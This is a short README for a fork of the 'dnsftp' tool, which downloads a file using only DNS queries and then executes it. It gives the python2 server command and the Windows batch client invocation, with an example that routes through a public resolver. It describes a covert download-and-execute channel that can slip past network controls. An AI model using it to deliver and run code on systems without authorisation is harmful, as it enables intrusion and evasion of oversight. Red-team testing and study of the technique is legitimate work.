## Purpose

Use only DNS queries to download a file, and then execute it.

## Usage

On the server hosting the file (tested with python2):

**sudo python server.py -f /path/to/file**

On the Windows client with batch script:

**client\client_batch\runme.bat _payloadserverhostname_  _fileparts_  _publicdnsserver_**

**Example: client\client_batch\runme.bat payloadserver.yourdomain.com  42  8.8.8.8**

If just testing internally, you can use the following example:

**client\client_batch\runme.bat _payloadserverhostname_  _fileparts_  _payloadserverIPaddr_**

Original author:
Stephen Breen - https://github.com/breenmachine/dnsftp

Forked and modified by:
Daniel Vinakovsky
